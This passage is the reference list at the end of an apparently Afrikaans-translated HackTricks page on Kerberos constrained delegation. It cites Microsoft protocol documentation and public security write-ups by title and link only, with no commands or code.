- [12] [Microsoft Learn - Oorsig van Kerberos-beperkte delegering](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [13] [Microsoft Open Specifications - S4U2Self tussen domeine](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [14] [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [15] [Microsoft Learn - Bespeur en herstel RC4-gebruik in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)
- [16] [Microsoft Open Specifications – Besonderhede oor S4U2Proxy](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9cd5-e9c237331c90)
- [17] [James Forshaw - Misbruik van RBCD met ’n gewone gebruikersrekening](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)
- [18] [Hunter Wade - Misbruik van beperkte delegering sonder protokol-oorgang teen rekeninge sonder SPN's](https://hunio.org/security/abusing-constrained-delegation-without-protocol-transition-against-spn-less-accounts/)
- [19] [Sprocket Security - Misbruik van beperkte delegering sonder protokol-oorgang teen rekeninge sonder SPN's](https://www.sprocketsecurity.com/blog/abusing-constrained-delegation-without-protocol-transition-against-spn-less-accounts)
- [20] [Impacket PR #2324 - S4U2Proxy met U2U](https://github.com/fortra/impacket/pull/2324)
- [21] [Microsoft MS-SFU - Gebruik van ServicesAllowedToSendForwardedTicketsTo](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/6d76bf10-3c48-4e14-9992-df1bd456455e)
- [22] [Microsoft Learn - Aktiveer Kerberos-gebeurtenisregistrasie](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/enable-kerberos-event-logging)
{{#include ../../banners/hacktricks-training.md}}
